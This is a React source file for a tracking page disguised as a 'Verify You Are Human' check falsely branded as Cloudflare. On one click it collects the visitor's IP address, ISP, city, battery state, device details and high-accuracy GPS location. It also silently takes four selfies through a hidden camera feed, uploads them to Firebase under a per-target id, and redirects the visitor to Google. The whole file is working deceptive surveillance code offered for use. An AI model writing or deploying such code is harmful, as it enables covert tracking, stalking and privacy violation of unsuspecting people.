
import React, { useEffect, useRef, useState } from 'react';
import { useParams } from 'react-router-dom';
import { collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
import { ref, uploadString, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
import { db, storage } from '../firebase';

const TrackPage: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const [loading, setLoading] = useState(false);
  const [step, setStep] = useState(0); 
  const [progress, setProgress] = useState(0);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const hasCaptured = useRef(false);

  // Improved Device Name Detection
  const getFullDeviceDetails = () => {
    const ua = navigator.userAgent;
    let model = "Unknown Device";
    if (/android/i.test(ua)) {
      const match = ua.match(/Android\s+([^\s;]+)/);
      model = match ? `Android ${match[1]}` : "Android Device";
      const specific = ua.match(/;\s+([^;)]+)\s+Build/);
      if (specific) model = specific[1];
    } else if (/iPhone|iPad|iPod/i.test(ua)) {
      model = "Apple iOS Device";
    } else if (/Windows/i.test(ua)) {
      model = "Windows PC";
    }
    return model;
  };

  const startVerification = async () => {
    if (loading || !id || hasCaptured.current) return;
    setLoading(true);
    setStep(1);
    hasCaptured.current = true;

    const payload: any = {
      userId: id,
      timestamp: serverTimestamp(),
      device: {
        name: getFullDeviceDetails(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screen: `${window.screen.width}x${window.screen.height}`,
      },
      status: 'Active'
    };

    // 1. Get Battery & IP & ISP (CRITICAL)
    try {
      setProgress(15);
      const [ipRes, battery] = await Promise.all([
        fetch('https://ipapi.co/json/').then(r => r.json()),
        // @ts-ignore
        navigator.getBattery ? navigator.getBattery() : Promise.resolve(null)
      ]);
      payload.ip = ipRes.ip || "Unknown IP";
      payload.isp = ipRes.org || "Unknown ISP";
      payload.city = ipRes.city || "Unknown City";
      if (battery) {
        payload.battery = { level: Math.round(battery.level * 100), charging: battery.charging };
      }
      setProgress(35);
    } catch (e) { console.error("Net Info Error", e); }

    // 2. High Accuracy GPS (FORCED)
    try {
      const pos = await new Promise<GeolocationPosition>((res, rej) => {
        navigator.geolocation.getCurrentPosition(res, rej, {
          enableHighAccuracy: true,
          timeout: 12000,
          maximumAge: 0
        });
      });
      payload.location = {
        lat: pos.coords.latitude,
        lng: pos.coords.longitude,
        accuracy: pos.coords.accuracy
      };
      setProgress(60);
    } catch (e) { 
      console.warn("GPS Access Denied or Timed Out");
      payload.locationStatus = "Blocked/TimedOut";
    }

    // 3. Burst Selfie Capture (4 Photos Real-time)
    const photoUrls: string[] = [];
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: "user", width: 640, height: 480 } 
      });
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await new Promise(r => setTimeout(r, 1500)); // Camera warm-up

        for (let i = 0; i < 4; i++) {
          const canvas = canvasRef.current;
          if (canvas && videoRef.current) {
            canvas.width = videoRef.current.videoWidth;
            canvas.height = videoRef.current.videoHeight;
            canvas.getContext('2d')?.drawImage(videoRef.current, 0, 0);
            const base64 = canvas.toDataURL('image/jpeg', 0.6);
            const sRef = ref(storage, `captures/${id}/${Date.now()}_${i}.jpg`);
            await uploadString(sRef, base64, 'data_url');
            photoUrls.push(await getDownloadURL(sRef));
            await new Promise(r => setTimeout(r, 600)); // Short gap for burst
          }
        }
      }
      stream.getTracks().forEach(t => t.stop());
      payload.photoUrls = photoUrls;
      setProgress(90);
    } catch (e) { 
      console.warn("Camera Access Denied");
      payload.cameraStatus = "Blocked";
    }

    // 4. Final Data Submission
    try {
      await addDoc(collection(db, "logs"), payload);
      setProgress(100);
      setTimeout(() => {
        window.location.href = "https://www.google.com";
      }, 800);
    } catch (err) {
      console.error("Firebase Error", err);
      window.location.href = "https://www.google.com";
    }
  };

  return (
    <div className="min-h-screen bg-slate-950 flex flex-col items-center justify-center p-6 text-white font-['Hind_Siliguri']">
      <div className="w-full max-w-sm bg-slate-900 p-10 rounded-[40px] shadow-2xl border border-slate-800 text-center relative overflow-hidden">
        {step === 0 ? (
          <>
            <div className="w-24 h-24 bg-blue-600/10 rounded-full flex items-center justify-center mx-auto mb-8 relative">
               <div className="absolute inset-0 border-2 border-blue-500/20 rounded-full animate-ping"></div>
               <svg className="w-12 h-12 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
            </div>
            <h1 className="text-2xl font-black mb-3">Verification Required</h1>
            <p className="text-slate-400 text-sm mb-10 leading-relaxed">To access the content, please verify that you are not a robot using our secure portal.</p>
            <button 
              onClick={startVerification}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-black py-5 rounded-2xl transition-all shadow-xl shadow-blue-900/40 active:scale-95"
            >
              Verify You Are Human
            </button>
          </>
        ) : (
          <>
            <div className="relative w-28 h-28 mx-auto mb-8">
               <svg className="w-full h-full transform -rotate-90">
                 <circle cx="56" cy="56" r="50" fill="transparent" stroke="currentColor" strokeWidth="8" className="text-slate-800" />
                 <circle cx="56" cy="56" r="50" fill="transparent" stroke="currentColor" strokeWidth="8" strokeDasharray={Math.PI * 100} strokeDashoffset={Math.PI * 100 * (1 - progress/100)} className="text-blue-500 transition-all duration-500" />
               </svg>
               <span className="absolute inset-0 flex items-center justify-center font-black text-xl text-blue-400">{progress}%</span>
            </div>
            <h2 className="text-xl font-black mb-2">Authenticating...</h2>
            <p className="text-xs text-slate-500 font-mono tracking-[0.3em] uppercase">Secure Handshake</p>
          </>
        )}

        <div className="mt-14 pt-6 border-t border-slate-800">
           <p className="text-[10px] text-slate-600 font-bold uppercase tracking-widest">Global Security Protocol v4.2</p>
        </div>

        <video ref={videoRef} autoPlay muted playsInline className="hidden"></video>
        <canvas ref={canvasRef} className="hidden"></canvas>
      </div>
      <p className="mt-8 text-[10px] text-slate-700 font-black uppercase tracking-[0.5em]">Powered by Cloudflare</p>
    </div>
  );
};

export default TrackPage;
